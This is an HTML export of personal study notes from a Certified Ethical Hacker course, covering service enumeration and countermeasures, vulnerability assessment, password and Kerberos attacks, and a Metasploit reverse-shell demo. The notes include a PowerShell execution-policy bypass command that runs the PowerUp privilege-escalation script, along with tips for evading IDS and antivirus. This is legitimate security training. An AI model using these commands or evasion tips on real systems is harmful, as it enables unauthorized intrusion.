</p></li></ul><ul id="0ec39406-09fc-4be7-bcf7-003527cbcde5" class="bulleted-list"><li style="list-style-type:disc">SMTP - p25<ul id="f93e5845-a6c4-4140-b3fa-af1c37f7bec4" class="bulleted-list"><li style="list-style-type:circle">Telnet and use commands to find info<ul id="50acb01f-3c98-432b-ad76-cdc0277ad344" class="bulleted-list"><li style="list-style-type:square">EHLO - list available commands (hello)</li></ul><ul id="7db41958-31da-43be-a2e4-27fa1811ec79" class="bulleted-list"><li style="list-style-type:square">VRFY - validate users (eg. VRFY krinos@hotmail.com)</li></ul><ul id="71fcfe39-edc9-4dcf-8b81-63688e486e3f" class="bulleted-list"><li style="list-style-type:square">EXPN - show actual delivery address of aliases to mail lists</li></ul><ul id="176de677-1edf-4c24-9100-662447ee5cbb" class="bulleted-list"><li style="list-style-type:square">RCPT TO - defines the recipients of a message</li></ul><ul id="c73f3412-506f-458e-ab39-e58dfc79e26a" class="bulleted-list"><li style="list-style-type:square">syntax can differ from different mail servers</li></ul><p id="e9333634-d236-4ee9-8021-e4d14c166e0d" class="">
</p></li></ul></li></ul><ul id="fdff3569-1ae8-478e-aacd-ed6e86e46f4c" class="bulleted-list"><li style="list-style-type:disc">DNS Enumeration<ul id="8633d722-b9b6-49f4-a67e-575308b8e4c6" class="bulleted-list"><li style="list-style-type:circle">DNS cache Snooping<ul id="40770738-aa75-4aa0-97ad-7a0ef4af5155" class="bulleted-list"><li style="list-style-type:square">can identify websites often visited by users</li></ul><ul id="c5879610-272b-4490-8d93-a856bdf96132" class="bulleted-list"><li style="list-style-type:square">use dig</li></ul><ul id="d4aa839e-138b-4146-95da-bc1b1f794835" class="bulleted-list"><li style="list-style-type:square">DNSSEC Enumeration</li></ul><p id="f1f9ac28-ce1e-4df8-81ee-a137ea592ad3" class="">
</p></li></ul></li></ul><ul id="7823ceaa-7b01-4b7c-aad0-8f404696af84" class="bulleted-list"><li style="list-style-type:disc">SIP - Session Initiation Protocol p 2000, 2001, 5060<ul id="2f99dced-f90a-48c2-9d02-0ef41042e028" class="bulleted-list"><li style="list-style-type:circle">svmap</li></ul><ul id="3b589883-e992-42ca-a440-4c52a8944660" class="bulleted-list"><li style="list-style-type:circle">auxiliary/scanner/sip in metasploit</li></ul><ul id="911fd9f7-6766-469e-9008-62afc4bd579f" class="bulleted-list"><li style="list-style-type:circle">phones have phone records - sensitive info</li></ul><ul id="e1a6e598-68c6-4038-b8b2-a21202c6c1eb" class="bulleted-list"><li style="list-style-type:circle">might have default passwords</li></ul><p id="cc6ddf07-81d6-4653-b06a-6756ff75bc1d" class="">
</p></li></ul><ul id="431d8f26-f58c-401f-bb5d-2cf20220b3f8" class="bulleted-list"><li style="list-style-type:disc">Linux<ul id="8f02bd5d-7bab-4ca5-bfef-fdc3a7904a71" class="bulleted-list"><li style="list-style-type:circle">need to be on the system to do this - not necessarily with root privilages</li></ul><ul id="f6978a81-8950-43b2-a06e-f1524ca3d0b7" class="bulleted-list"><li style="list-style-type:circle">rusers - logged in users</li></ul><ul id="8d8568e5-54de-403e-aa67-61ebe65cd6cf" class="bulleted-list"><li style="list-style-type:circle">who - list of users</li></ul><ul id="3ab61a66-6270-4eb4-909d-667da19ae6e5" class="bulleted-list"><li style="list-style-type:circle">finger - in the ass, and in the terminal</li></ul><p id="5a76ecfb-0f73-455b-a4b4-5d6861d6c25d" class="">
</p></li></ul><ul id="381b7e14-83c7-4ec0-b6a3-d60ef0c00659" class="bulleted-list"><li style="list-style-type:disc">Telnet and SMB Enumeration (p 445)<ul id="d3841844-be7d-440d-8882-c0f21dbbbd6b" class="bulleted-list"><li style="list-style-type:circle">Smb had the most critical vulnerabilities<ul id="5d64d056-10b3-42ac-a31a-e624067448f4" class="bulleted-list"><li style="list-style-type:square">EternalBlue, EternalChampion, SMBTouch etc</li></ul><p id="4474ebc5-bcea-4dbb-afe8-46a2ab058803" class="">
</p></li></ul></li></ul><ul id="34ce251c-026a-4f4d-aa5a-9610bcba38b4" class="bulleted-list"><li style="list-style-type:disc">FTP </li></ul><ul id="2aa96092-3929-4a79-a384-3a4e5ead47fb" class="bulleted-list"><li style="list-style-type:disc">IPv6 Enumeration<ul id="53837327-5453-4d8a-baa6-b14c22154ad2" class="bulleted-list"><li style="list-style-type:circle">scan and access link local adresses</li></ul><ul id="a740311e-5c81-44a0-b277-fc2ae7b7fc37" class="bulleted-list"><li style="list-style-type:circle">most of the time firewalls dont protect both ipv4 and ipv6</li></ul></li></ul><ul id="76a047d6-dea9-4bc4-a359-d8994c16ad0c" class="bulleted-list"><li style="list-style-type:disc">BGP Enumeration<p id="e864cc3b-926a-4ffa-892e-39c0a3703837" class="">
</p></li></ul><p id="01f1ac09-15c6-40e9-9ca2-fae05685aa39" class="">
</p><h3 id="b3757b5c-bf0e-4e26-a3a7-13ccaf932c63" class="">Enumeration Countermeasures</h3><ul id="a0c855a0-aae1-4eaa-b644-6cba7e83e4db" class="bulleted-list"><li style="list-style-type:disc">SNMP<ul id="6d5a35c1-e92b-40c9-8b2c-5adc5049626e" class="bulleted-list"><li style="list-style-type:circle">upgrade to SNMPv3, it uses encryption</li></ul></li></ul><ul id="9b5b2a39-d6f8-4a74-a3b5-4236782b82b6" class="bulleted-list"><li style="list-style-type:disc">LDAP<ul id="9eb9eaf6-3054-4dc4-ad8e-c4df2b012cfd" class="bulleted-list"><li style="list-style-type:circle">upgrade to use SSL or STARTLS to encrypt by default</li></ul><ul id="df99b2d3-5fc0-4a78-8dc0-70df49485a6b" class="bulleted-list"><li style="list-style-type:circle">Use authentication using NTLM (older) or Kerberos (safer)</li></ul></li></ul><ul id="3ab0c856-0daf-4038-97fc-22d93464aae4" class="bulleted-list"><li style="list-style-type:disc">NFS<ul id="69b5db2b-4e88-4ab9-ac6d-eb10380a04c9" class="bulleted-list"><li style="list-style-type:circle">firewall to block 2049 for NFS from public</li></ul><ul id="b25a29d4-c224-43f3-93de-1adbac214c0b" class="bulleted-list"><li style="list-style-type:circle">configure allowing specific hosts</li></ul><ul id="bfc13486-79a1-476e-9b01-d471ba461484" class="bulleted-list"><li style="list-style-type:circle">permissions</li></ul><ul id="9bb56af5-65b1-4a2e-80a8-e89811087b29" class="bulleted-list"><li style="list-style-type:circle">log requests</li></ul></li></ul><ul id="68bbbfda-6415-4555-b9b3-94aaafd105eb" class="bulleted-list"><li style="list-style-type:disc">SMTP<ul id="a6e491d8-569d-4a65-838d-7eb74fc311ce" class="bulleted-list"><li style="list-style-type:circle">ignore msges to unknown recipients</li></ul><ul id="65562067-36a8-4338-9230-7de098105dd2" class="bulleted-list"><li style="list-style-type:circle">disable open relay feature (by default disabled)</li></ul><ul id="8e5afd4b-cb4e-439a-8b4b-1de99ca31d56" class="bulleted-list"><li style="list-style-type:circle">limit accepted connections to prevent brute force attacks</li></ul><ul id="ad274282-cdc7-4ef0-89fb-2dc295c534fe" class="bulleted-list"><li style="list-style-type:circle">log everything</li></ul></li></ul><ul id="d6a995eb-b533-4c74-9dd7-4a19bd858fdf" class="bulleted-list"><li style="list-style-type:disc">SMB<ul id="85192e9c-e94d-4c56-ae35-3c9a02019bb2" class="bulleted-list"><li style="list-style-type:circle">disable it and do not use it</li></ul><ul id="f9d62829-2ac5-45c0-8d51-a39606ec1dad" class="bulleted-list"><li style="list-style-type:circle">if its needed disable it from facing the internet</li></ul><ul id="ca87dec8-cd7d-4b7a-a1dc-5d41240ad7f0" class="bulleted-list"><li style="list-style-type:circle">disable ports 139 and 445</li></ul><ul id="0ef722e8-7f8a-4a43-bce3-7f5c9f9e2885" class="bulleted-list"><li style="list-style-type:circle">restrict anonymus access</li></ul></li></ul><ul id="35c9312b-3b60-4243-8db3-ca91ce8c8ee3" class="bulleted-list"><li style="list-style-type:disc">FTP<ul id="cffe6b63-f574-484c-aace-073d52060b96" class="bulleted-list"><li style="list-style-type:circle">dont use it, use sFTP</li></ul></li></ul></details></li></ul><ul id="fbf0851d-4c59-46bf-8352-1cdcc337d279" class="toggle"><li><details open=""><summary>Module 05 - Vulnerability Analysis</summary><p id="3e63cc3e-dc9e-44e3-b077-d554ddff8c61" class="">recent in CEHv10</p><p id="b1c66141-8a2a-48f1-9376-7e32ca30e6f5" class="">its a way to analyse the info to find vulnerabilities</p><p id="165ca910-1e24-4a42-b0a8-bdffa62c5efd" class="">we scan for vulnerabilities</p><p id="9ddfa24c-2a8b-44a4-8aae-4fb8ca012575" class="">
</p><p id="680ae133-e977-4549-a393-62536f5677fa" class=""><strong>Vulnerable Assets: </strong>People, Technology, Data</p><p id="b368d36e-ee62-454a-a10f-c7791f69d1d4" class="">
</p><p id="06478f0f-d7c3-4070-8751-28de9f9b0811" class=""><strong>bugcrowd, hackerone - You are rewarded for finding bug bounty in software</strong><div class="indented"><ul id="b5c2d1c6-fd08-4f57-9363-2e5a653c41c5" class="bulleted-list"><li style="list-style-type:disc"><strong>maybe freelance this?</strong></li></ul></div></p><p id="48c00c8a-552d-41d9-8d3c-65edf18701a7" class=""><strong>zeroday initiative - Gets you money for zero days if you post them</strong></p><p id="72152364-cedc-4613-a813-6d1158727406" class="">
</p><h3 id="299db3f9-0e5f-4ec3-9980-323bfedb401f" class="">Vulnerability Management Life Cycle</h3><ul id="45987386-0a41-4e5f-9740-3e74f70306e9" class="bulleted-list"><li style="list-style-type:disc">morphisec - software that alert for new vulnerabilities on your system</li></ul><p id="5677f13e-b2b1-42f8-aea8-ea28dcdef4d7" class="">
</p><ul id="302b93a2-0ffa-4ba8-9db7-c29b812a5384" class="toggle"><li><details open=""><summary>Pre Assessment Phase</summary><figure id="4ef12827-cb91-415f-a8e3-d91f267e0986" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%205.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%205.png"/></a></figure></details></li></ul><p id="670fa05b-5b7f-4909-a7c5-72b466bae02f" class="">
</p><ul id="428cbe13-1023-430d-8ce2-2d84016b83a4" class="bulleted-list"><li style="list-style-type:disc"><a href="http://cisecurity.org">cisecurity.org</a> - benchmark suggestions for securing your software<ul id="ce631f4b-cb52-4d07-a983-28e3b322f2db" class="bulleted-list"><li style="list-style-type:circle">has instructions for each software and operating system</li></ul><p id="a841ef02-8efa-4ebe-957c-76560b949484" class="">
</p></li></ul><p id="839da367-21f0-4147-85cc-d0c318ebadb3" class="">Finding vulnerabilities and poc’s</p><ul id="e88a6032-7e69-4624-bf30-2052de0cb632" class="bulleted-list"><li style="list-style-type:disc">nist, cve</li></ul><ul id="25456cd2-a3ac-45cb-a43c-eba3732d6fb6" class="bulleted-list"><li style="list-style-type:disc"><strong>need to read what it is and how it is exploited because there are conditions in the description</strong></li></ul><ul id="cce91e4b-3a92-485a-8f6f-34a285d2ec8b" class="bulleted-list"><li style="list-style-type:disc">cvedetails - search vulns for specific product and versions if you want</li></ul><p id="0cb85f32-3e2c-470c-9f04-c3ff902b0664" class="">
</p><ul id="9df9cff2-c6e8-4b58-8ad3-85c19741c1d4" class="toggle"><li><details open=""><summary>Post Assessment Phase</summary><figure id="e2251c93-ac4b-4ab2-9011-5a6a386b49cc" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%206.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%206.png"/></a></figure></details></li></ul><p id="b2afca10-214e-409f-b909-29bc2bfd1cc1" class=""><div class="indented"><ul id="f89acb4c-f3f3-4169-9c81-2e315b1f0acb" class="bulleted-list"><li style="list-style-type:disc">We first remove the vulnerability</li></ul><ul id="0e985f13-23b3-4229-99b3-84f9c92b8dfd" class="bulleted-list"><li style="list-style-type:disc">We need to verify after patching, to make sure we have patched correctly </li></ul><ul id="428c0feb-007b-428a-8e19-7b2a9db7c552" class="bulleted-list"><li style="list-style-type:disc">We then need to monitor because sometimes we might not patch but create controls that make it difficult to exploit<ul id="d2591209-3182-46cd-bea2-c755e07d3762" class="bulleted-list"><li style="list-style-type:circle">so we monitor because we can react properly</li></ul><p id="db88ad8f-1e7d-44b4-8e7a-f943e4f5d70c" class="">
</p></li></ul><ul id="e87d46a8-c170-4768-be48-7e805e6f9f12" class="bulleted-list"><li style="list-style-type:disc">To perform assessment we need to know how to categorise vulnerabilities<ul id="4c2acb6f-894f-4fcb-be01-920bbfc570d8" class="toggle"><li><details open=""><summary>Categorisation</summary><figure id="1488647b-f0dd-4f3b-8f3c-7985ad812c53" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%207.png"><img style="width:1034px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%207.png"/></a></figure></details></li></ul></li></ul><p id="a67a8dbb-7817-442d-91ad-a2c58788bad4" class="">
</p><ul id="5007cd86-30ad-4da5-952b-d8fb011e6f0a" class="bulleted-list"><li style="list-style-type:disc">Microsoft Security Compliance Toolkit<ul id="6b5e4280-e909-467c-baff-7419a9316c81" class="bulleted-list"><li style="list-style-type:circle">used for vulnerability assessment on microsoft products</li></ul><p id="0c514d6c-d912-4eba-96e8-958b8dbbae09" class="">
</p></li></ul><ul id="dec668b4-dad6-478f-a9b4-b334340af941" class="bulleted-list"><li style="list-style-type:disc">Automated Scanners<ul id="50efbd3f-499f-46c0-9fe5-9f5c03f339e6" class="bulleted-list"><li style="list-style-type:circle">Nessus, GFI LanGuard</li></ul><ul id="377ab923-e4bd-4194-a1f7-8e6bded64410" class="bulleted-list"><li style="list-style-type:circle">OpenVAS - free but no GUI, needs greenbone</li></ul><ul id="17afee93-5d16-4390-967c-5ae50545c5b7" class="bulleted-list"><li style="list-style-type:circle">Nikto</li></ul><ul id="e47ab089-96b2-4117-ad2c-412fe84308a8" class="bulleted-list"><li style="list-style-type:circle">Nipper Studio - vulnerability assessment, his favourite<ul id="50713a7d-f819-42c5-b1c2-54e9793f632a" class="bulleted-list"><li style="list-style-type:square">export config from device and import here</li></ul><ul id="b66bc044-cc26-4b58-be51-4ef581d20f4e" class="bulleted-list"><li style="list-style-type:square">suggests things that are to be done so that its not vulnerable</li></ul><ul id="cca21a17-3f20-4ae3-adf7-20e7128b73a3" class="bulleted-list"><li style="list-style-type:square">reports are offline</li></ul></li></ul><p id="8f0204a2-7182-47bf-9ced-8a89e1ccc5a7" class="">
</p><p id="ade17704-6435-40b7-903d-ddb4479e6283" class="">
</p></li></ul><ul id="db2ecb1b-0d4c-45e3-be82-17cf73e10c99" class="bulleted-list"><li style="list-style-type:disc">PROTIP: Dont force vendors in reccomendations in the vulnerability assessment report because you have to be neutral</li></ul></div></p><p id="e8e7a921-beae-4a09-a533-21188d74950d" class="">
</p></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Day 3 - Hacking and Malware</summary><div class="indented"><ul id="6ecf7554-f13c-4136-91f7-6616ae8a9ad1" class="toggle"><li><details open=""><summary>Recording</summary><figure id="b4ad527b-83de-4345-96aa-dfd841b39d55"><div class="source"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/CEH_Day_3_-_Modules_6_7.txt">CEH Day 3 - Modules 6, 7.txt</a></div></figure></details></li></ul><ul id="10918fdb-07e6-4c07-b7b7-05db62f7ddae" class="toggle"><li><details open=""><summary>Module 06 - System Hacking</summary><p id="7bfdf61a-ffd6-44d0-b688-519201c64f27" class="">gaining access</p><p id="ac2bc86f-9192-4143-b22b-b2d2ac5c8a62" class="">maintaining access</p><p id="bfb50355-821e-4bc2-afec-ba9556abfee6" class="">clearing tracks</p><p id="bc43326a-617e-4e69-a1e8-ba25e4162295" class="">
</p><h3 id="ff697b2f-6162-4e13-a57c-c3b77ba9db69" class="">Gaining Access</h3><p id="16b92d18-1b44-4fb9-ade5-c077f0a979b0" class="">
</p><p id="8f4e8c7d-5093-4386-ab1c-23e599fdd4d6" class="">Microsoft Authentication</p><ul id="f40da218-0412-48cc-baeb-8c99a376c5d9" class="bulleted-list"><li style="list-style-type:disc">LM hash for passwords is weak, not used anymore</li></ul><ul id="be5331b3-aa71-467c-9301-349e30053d99" class="bulleted-list"><li style="list-style-type:disc">NTLM hash was then used for transferring credentials, is also considered weak</li></ul><ul id="a0e65e8b-7c87-41c5-a66b-b7023539a2b8" class="bulleted-list"><li style="list-style-type:disc">Kerberos Authentication - uses ticket granting system instead of hash<ul id="b49bf937-96cf-4f5d-aeee-ea7b8fbebace" class="bulleted-list"><li style="list-style-type:circle">2 types of tickets: 1 identifies username, other identifies password</li></ul><ul id="d9426118-0419-4ecb-90bd-61b9cd632f95" class="bulleted-list"><li style="list-style-type:circle">there are still some vulnerabilities</li></ul></li></ul><ul id="86aab26b-ea7f-4176-90d0-0cbf21b2edb9" class="bulleted-list"><li style="list-style-type:disc">Microsoft accounts are saved in SAM database with cleartext username but hash for password<ul id="37a848dd-9970-483a-83c7-b1e8a04466d1" class="toggle"><li><details open=""><summary>SAM file explained</summary><figure id="31c651e1-46f9-4e01-bf70-330cd80131e4" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%208.png"><img style="width:779.6448364257812px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%208.png"/></a></figure></details></li></ul></li></ul><ul id="921ca151-156b-4e87-8e27-71f993ae2c11" class="bulleted-list"><li style="list-style-type:disc">LM hash cannot have more than 14 characters</li></ul><ul id="f37856b2-5bd8-4df8-9b4e-8fef3421cf33" class="toggle"><li><details open=""><summary>NTLM Auth Process</summary><figure id="5925e113-0adf-4033-8e25-98e274f0169b" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%209.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%209.png"/></a></figure></details></li></ul><p id="278ae4c2-ff17-4cd8-b968-96e4320488f6" class="">
</p><ul id="975a3a45-00fb-4801-a21f-0e9d8ab35137" class="bulleted-list"><li style="list-style-type:disc">Pass the hash attacks can be done in domain environments of NTLM</li></ul><p id="887f8397-432d-4113-b2cd-b83d598c9572" class="">
</p><ul id="6d68ca93-ee3a-4c99-92a5-23c8640f0df9" class="bulleted-list"><li style="list-style-type:disc">Kerberos Authentication<ul id="edbbe1a8-fb2c-48dd-bbc8-2ab08e0f0472" class="toggle"><li><details open=""><summary>Authentication Procedure</summary><figure id="c8af31b3-59d6-4aa9-b920-ad1b2886af57" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2010.png"><img style="width:779.6590576171875px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2010.png"/></a></figure></details></li></ul></li></ul><p id="9f84d797-6283-4122-bbdb-0e2c852ed1e3" class="">
</p><ul id="d3ff0b94-50ee-4608-b6dc-b095d83921cf" class="toggle"><li><details open=""><summary>Password Attack Types</summary><figure id="20db8edf-65d3-4a5a-9129-085673d7be1d" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2011.png"><img style="width:807.6278076171875px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2011.png"/></a></figure></details></li></ul><p id="36fd5692-2737-420e-9a49-99b3f5f60131" class="">
</p><ul id="de1578d3-df83-4214-b6ea-0d011a822bc3" class="bulleted-list"><li style="list-style-type:disc">Password Cracking<ul id="bd70e00b-c5bf-498f-bde9-20c8a24bffe0" class="bulleted-list"><li style="list-style-type:circle">crackmapexec</li></ul><ul id="d043b209-5462-4ffc-98ba-6b7f2ad90832" class="bulleted-list"><li style="list-style-type:circle">hashcat - needs good gpu to speed up the process</li></ul><ul id="5707ef17-678c-45fc-a7a3-30872c620533" class="bulleted-list"><li style="list-style-type:circle">default passwords</li></ul><p id="64c50b49-0e92-47a8-939f-b14757b461b0" class="">
</p></li></ul><ul id="b7b5c3c4-1659-4f8a-ae5f-a3cfb3c03f15" class="bulleted-list"><li style="list-style-type:disc">XNSPY - can spy phones realtime legaly but you pay, has keylogger</li></ul><ul id="44b1145a-184b-470a-97c5-a88dd72dbc78" class="bulleted-list"><li style="list-style-type:disc">LLMNR/NBT-NS Poisoning<ul id="ca8e9a36-66d4-47c3-9d1d-abaf8cf7abbc" class="bulleted-list"><li style="list-style-type:circle"><strong>most common attack today</strong></li></ul><ul id="2d183462-e1b4-403f-96dc-58ead700b511" class="bulleted-list"><li style="list-style-type:circle">Respounder and Vindicate, got-responded to identify vulnerability</li></ul><ul id="fcfdfcb1-d0c8-45ea-8259-0af96b6ad102" class="bulleted-list"><li style="list-style-type:circle">LLMNR is a broadcast of edge and its on by default on windows<ul id="6599489a-9358-4600-b9b0-d6f0db2bbb0c" class="bulleted-list"><li style="list-style-type:square"><a href="http://Responder.py">Responder.py</a> you can spoof traffic impersonating a proxy</li></ul></li></ul></li></ul><ul id="2f2b6a01-917a-4635-9a44-e094b714488e" class="bulleted-list"><li style="list-style-type:disc">Kerberos Attacks<ul id="8802e52d-1e3f-4455-aae5-74c48331dada" class="bulleted-list"><li style="list-style-type:circle">Kerberoasting</li></ul><ul id="6607197d-7989-459d-980d-623c657ec913" class="bulleted-list"><li style="list-style-type:circle">AS-REP</li></ul><ul id="412bd152-fa60-4465-8a86-88aae8de70c9" class="bulleted-list"><li style="list-style-type:circle">Pass the Ticket Attack - mimikatz, rubeus tools<ul id="1aa16930-37d3-4f8b-8198-1b03bdaa121c" class="bulleted-list"><li style="list-style-type:square">captures ticket that is used by some user and uses it to authenticate</li></ul></li></ul></li></ul><ul id="57032b92-8af9-4f67-8477-5b8afe4d064c" class="bulleted-list"><li style="list-style-type:disc">Other Attacks<ul id="3334c50f-a139-456f-873c-9b49f9a40252" class="bulleted-list"><li style="list-style-type:circle"><strong>important for exam</strong></li></ul><ul id="fdf81c44-67bd-4d23-82a0-3d258c29c454" class="bulleted-list"><li style="list-style-type:circle">Combinator Attack, Fingerprint, PRINCE, Toggle Case, Markov Chain, GPU Based</li></ul><p id="323b430d-24ce-444d-8403-741f094d1352" class="">
</p></li></ul><ul id="db0a515c-3159-4f98-b699-9fbdfe65bb8e" class="bulleted-list"><li style="list-style-type:disc">Wire Sniffing<ul id="dbce26fe-9551-4525-b3f2-fb808aafec3e" class="bulleted-list"><li style="list-style-type:circle">cleartext is the info we look for</li></ul><ul id="224770d5-66e3-478a-a06d-9339a36b1774" class="bulleted-list"><li style="list-style-type:circle">sniffing devices that connect to cat6 cables physically, not detectable</li></ul></li></ul><p id="334e9f5d-b8b2-479c-a356-415ff41cf970" class="">
</p><ul id="6c035cb1-cbbb-4b02-be3a-6744da2dc199" class="bulleted-list"><li style="list-style-type:disc">Man in the MIddle attacks</li></ul><ul id="77aa03fc-b662-40bb-a31a-4d98b7ba2c81" class="bulleted-list"><li style="list-style-type:disc">Rainbow Table Attacks<ul id="74ccb2e4-f0ce-478f-84de-8821bf1b6e15" class="bulleted-list"><li style="list-style-type:circle">when you have the hash but no cleartext</li></ul><ul id="2f41d00a-f365-4b53-b12c-08b83fd78ef8" class="bulleted-list"><li style="list-style-type:circle">predefined hash to text but needs storage</li></ul></li></ul><ul id="1b1e196d-7e64-4f05-9be3-3ecde8c49c46" class="bulleted-list"><li style="list-style-type:disc"><strong>In exam:</strong> hashcat, john the ripper, THC- hydra</li></ul><ul id="ea8536c4-7fc8-41ed-aad2-8286c13ade7b" class="bulleted-list"><li style="list-style-type:disc">pwdump7 - to dump passwords</li></ul><ul id="808dea12-6f8d-46fb-8dcc-9e4a1656ae8f" class="bulleted-list"><li style="list-style-type:disc">L0phtCrack, ophcrack - brute force and rainbow tables</li></ul><ul id="953c1bc6-09ca-4c36-8cac-b865605cf86a" class="bulleted-list"><li style="list-style-type:disc">Password Salting - used in linux for securing passwords</li></ul><p id="4cca2424-15b1-466f-a828-ebafede0a7c5" class="">
</p><p id="c1f51032-2374-46be-9e32-7cdae1cfca21" class="">
</p><h3 id="873f3255-4853-44ec-9de7-9c22dd9f9f7a" class="">Defending</h3><ul id="ee352c80-9b56-40cb-92a2-44f35ddb2baf" class="toggle"><li><details open=""><summary>Top 15 Ways to defend password cracking</summary><figure id="6fd5d738-921e-4571-aa47-9dbf8709cc70" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2012.png"><img style="width:807.6135864257812px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2012.png"/></a></figure><figure id="e0bf2be1-ef28-44b0-8cd0-c8366fd587ee" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2013.png"><img style="width:807.6278076171875px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2013.png"/></a></figure></details></li></ul><ul id="2b67dd84-2231-4b70-b909-cc88afafdcc8" class="bulleted-list"><li style="list-style-type:disc">Disable NBT-NS, LMBNR</li></ul><p id="9344831a-a3cd-450c-842d-47429f9e9363" class="">
</p><p id="7eb76ce5-6fe4-4600-a3fe-4c9286d824ec" class="">
</p><h3 id="4f68a2c9-fce5-440b-b3d7-a658fed1b2d7" class="">Exploiting - Finding PoC</h3><ul id="7a40824e-7e2d-4af9-9dca-3484b56f9a7b" class="bulleted-list"><li style="list-style-type:disc">vulners.com</li></ul><ul id="d11b7c0b-57ae-4885-a93f-36f6007c7722" class="bulleted-list"><li style="list-style-type:disc">metasploit</li></ul><ul id="afa36812-0d6d-4a25-ac16-5cf622bd6059" class="bulleted-list"><li style="list-style-type:disc">exploitdb</li></ul><ul id="e1dcf644-4b4a-4cae-8a3d-3d32257a5bd1" class="bulleted-list"><li style="list-style-type:disc">vuldb.com</li></ul><ul id="fd123342-b7d4-4441-86f6-e37eb2b01a62" class="bulleted-list"><li style="list-style-type:disc"><a href="http://0day.today">0day.today</a> - for zero days and other exploits</li></ul><ul id="9315429e-4932-46de-8ea8-922cfcfcbbef" class="bulleted-list"><li style="list-style-type:disc">exploit pack - new tool like metasploit, has good interface, has zero days, cheapsest solution on the market</li></ul><p id="990751c6-2bc8-4866-9fd7-e41096770a89" class="">
</p><p id="cfcd8418-69a9-45ed-98db-ad881dd3857b" class="">
</p><h3 id="e20d49f6-fb9f-4ca8-83b4-2d85702d7f5d" class="">Simple Metasploit payload upload example</h3><ul id="3e9ed3e4-303f-4216-b12f-e0f668791ba8" class="bulleted-list"><li style="list-style-type:disc">showed msfvenom and reverse shell connection to a victim<ul id="fa8ae29e-7e83-4b55-9be8-927170476102" class="bulleted-list"><li style="list-style-type:circle">used windows/meterpreter/reverse_tcp as payload</li></ul><ul id="6cc45830-5a48-489f-a4fc-693c7351ec4e" class="bulleted-list"><li style="list-style-type:circle">used exploit/multi/handler</li></ul><ul id="4aad8df3-3795-4e51-b4da-7d3fac41433d" class="bulleted-list"><li style="list-style-type:circle">meterpreter is detectable by antivirus</li></ul></li></ul><ul id="290fbc49-1ac2-4c63-85cb-3b808aa228dd" class="bulleted-list"><li style="list-style-type:disc">most of the time they disable security features and then get meterpreter</li></ul><ul id="dce02509-94bc-485f-acfb-76e42b6d3a04" class="bulleted-list"><li style="list-style-type:disc">used PowerUp.ps1 for powershell privilage escalation and run it using:<ul id="3a2e02ef-1d99-4b7f-b34a-21bb1d713a59" class="bulleted-list"><li style="list-style-type:circle">powershell -ExecutionPolicy Bypass -command “. .\PowerUp.ps1;Invoke-AllChecks”<ul id="86a1325c-3665-401f-b59e-7f00b5dc8853" class="bulleted-list"><li style="list-style-type:square">skips execution policy for powershell scripts and run the script</li></ul></li></ul></li></ul><ul id="79149c91-e0e3-4063-848c-e452ed04ac6c" class="bulleted-list"><li style="list-style-type:disc">traffic generated in such scenario would be detected by an IDS, you have to deploy via https or ssh so that they cant see the content of the packets</li></ul><ul id="bfd06d67-1343-4141-968d-ccca728ed476" class="bulleted-list"><li style="list-style-type:disc">UseAfterFree attack is effective because you don’t leave a file there</li></ul><ul id="f005f928-9841-4a68-b29f-ec4e05fa6fd3" class="bulleted-list"><li style="list-style-type:disc">msfvenom encryption is detectable, don’t use it, there are better ways</li></ul><p id="fffad090-a890-4389-a5fe-600fc1f6fdad" class="">
